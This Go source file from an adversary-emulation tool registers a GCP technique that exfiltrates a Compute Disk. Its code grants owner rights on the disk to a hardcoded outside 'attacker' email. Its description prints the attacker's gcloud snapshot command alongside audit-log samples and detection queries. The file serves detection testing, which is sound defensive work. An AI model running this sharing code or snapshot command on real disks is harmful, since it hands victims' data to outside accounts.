package gcp

import (
	compute "cloud.google.com/go/compute/apiv1"
	"context"
	computepb "google.golang.org/genproto/googleapis/cloud/compute/v1"
	"log"

	_ "embed"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.exfiltration.share-compute-disk",
		FriendlyName: "Exfiltrate Compute Disk by sharing it",
		Description: `
Exfiltrates a Compute Disk by sharing with a fictitious attacker account. The attacker could then create a snapshot of the disk in their GCP project.

Warm-up:

- Create a Compute Disk

Detonation:

- Set the IAM policy of the disk so that the attacker account has permissions to read the disk in their own project
`,
		Detection: `
You can detect when someone changes the IAM policy of a Compute Disk, using the GCP Admin Activity audit logs event <code>v1.compute.disks.setIamPolicy</code>. Here's a sample event, shortened for clarity:

` + codeBlock + `json hl_lines="18 20 25""
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "user-sharing-the-disk@domain.tld",
      "principalSubject": "user:user-sharing-the-disk@domain.tld"
    },
    "requestMetadata": {
      "callerIp": "34.33.32.31",
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/..."
    },
    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk",
    "request": {
      "policy": {
        "version": "3",
        "bindings": [
          {
            "role": "roles/owner",
            "members": [
              "user:attacker@gmail.com"
            ]
          }
        ]
      },
      "@type": "type.googleapis.com/compute.disks.setIamPolicy"
    }
  }
}
` + codeBlock + `

After the attacker has permissions on the Compute Disk, they can create a snapshot of it in their own GCP project using:

` + codeBlock + `bash
gcloud compute snapshots create stolen-snapshot \
	--source-disk https://www.googleapis.com/compute/v1/projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk
` + codeBlock + `

When they do so, a GCP Admin Activity event <code>v1.compute.snapshots.insert</code> is generated in the victim project, 
indicating that the attacker has not only shared but also actively stolen data from the disk (sample event shortened below):

` + codeBlock + `json hl_lines="5 6 14 16"
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "attacker@gmail.com",
      "principalSubject": "user:attacker@gmail.com"
    },
    "requestMetadata": {
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/...",
      // Note: the IP of the attacker is not logged in this event
    },
    "serviceName": "compute.googleapis.com",
    "methodName": "v1.compute.snapshots.insert",
    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-disk",
    "request": {
      "@type": "type.googleapis.com/compute.snapshots.insert"
    },
    "metadata": {
      "@type": "type.googleapis.com/google.cloud.audit.CrossEntityControlAuditMetadata"
    }
  }
}
` + codeBlock + `

Based on these events, detection strategies may include:

- Alerting when the IAM policy of a Compute Disk is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:

` + codeBlock + `sql
protoPayload.methodName="v1.compute.disks.setIamPolicy"
` + codeBlock + `

- Alerting when someone with an unexpected e-mail domain creates a snapshot of a Compute Disk. Sample GCP Logs Explorer query:

` + codeBlock + `sql
protoPayload.methodName="v1.compute.snapshots.insert"
NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
` + codeBlock + `
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		Detonate:                   detonate,
		Revert:                     revert,
		PrerequisitesTerraformCode: tf,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	diskName := params["disk_name"]
	zone := params["zone"]
	attackerEmail := "christophe@somewhereinthe.cloud"

	log.Println("Exfiltrating " + diskName + " by sharing it with a fictitious attacker")
	err := shareDisk(gcp, diskName, zone, attackerEmail)
	if err != nil {
		return fmt.Errorf("failed to share disk: %w", err)
	}
	log.Println("Successfully shared disk with a fictitious attacker account " + attackerEmail)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	diskName := params["disk_name"]
	zone := params["zone"]

	log.Println("Unsharing " + diskName)
	err := unshareDisk(gcp, diskName, zone)
	if err != nil {
		return fmt.Errorf("unable to unshare disk: %w", err)
	}
	log.Println("Successfully unshared the disk - it is now private again")
	return nil
}

func shareDisk(gcp *providers.GCPProvider, diskName string, zone string, targetUser string) error {
	diskClient, err := compute.NewDisksRESTClient(context.Background(), gcp.Options())
	if err != nil {
		return fmt.Errorf("unable to create compute client: %w", err)
	}

	roleName := "roles/owner"

	_, err = diskClient.SetIamPolicy(context.Background(), &computepb.SetIamPolicyDiskRequest{
		Resource: diskName,
		Project:  gcp.GetProjectId(),
		Zone:     zone,
		ZoneSetPolicyRequestResource: &computepb.ZoneSetPolicyRequest{
			Policy: &computepb.Policy{
				Bindings: []*computepb.Binding{
					{
						Members: []string{"user:" + targetUser},
						Role:    &roleName,
					},
				},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("unable to set iam policy: %w", err)
	}
	return nil
}

func unshareDisk(gcp *providers.GCPProvider, diskName string, zone string) error {
	diskClient, err := compute.NewDisksRESTClient(context.Background(), gcp.Options())
	if err != nil {
		return fmt.Errorf("unable to create compute client: %w", err)
	}

	_, err = diskClient.SetIamPolicy(context.Background(), &computepb.SetIamPolicyDiskRequest{
		Resource: diskName,
		Project:  gcp.GetProjectId(),
		Zone:     zone,
		ZoneSetPolicyRequestResource: &computepb.ZoneSetPolicyRequest{
			Policy: &computepb.Policy{
				Bindings: []*computepb.Binding{},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("unable to set iam policy: %w", err)
	}
	return nil
}
